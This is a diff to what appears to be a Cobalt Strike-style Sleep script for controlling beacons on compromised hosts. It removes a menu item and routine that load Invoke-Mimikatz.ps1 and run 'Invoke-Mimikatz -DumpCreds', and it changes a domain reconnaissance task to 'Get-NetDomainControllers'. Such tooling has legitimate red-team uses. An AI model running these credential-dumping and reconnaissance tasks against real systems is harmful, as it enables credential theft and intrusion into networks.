@@ -50,24 +50,7 @@ sub task_get_dom {
    task_powershell_import($beacon_id, $data);
 
    # actually task the beacon
-   task_powershell($beacon_id, "Get-NetDomain");
-}
-
-sub task_mimikatz {
-   $beacon_id = $1;
-
-   $script_source = script_resource("Invoke-Mimikatz.ps1");
-
-   # get all of our data that we're going to upload
-   $handle = openf($script_source);
-   $data = readb($handle, -1);
-   closef($handle);
-
-   # task the beacon to import the powershell data
-   task_powershell_import($beacon_id, $data);
-
-   # actually task the beacon
-   task_powershell($beacon_id, "Invoke-Mimikatz -DumpCreds");
+   task_powershell($beacon_id, "Get-NetDomainControllers -Verbose");
 }
 
 ###
@@ -76,13 +59,6 @@ popup beacon_top {
      local('$bid');
      foreach $bid ($1) {
         task_get_dom($bid);
-     }
-   }
-
-   item "Mimikatz" {
-     local('$bid');
-     foreach $bid ($1) {
-        task_mimikatz($bid);
      }
    }
 }
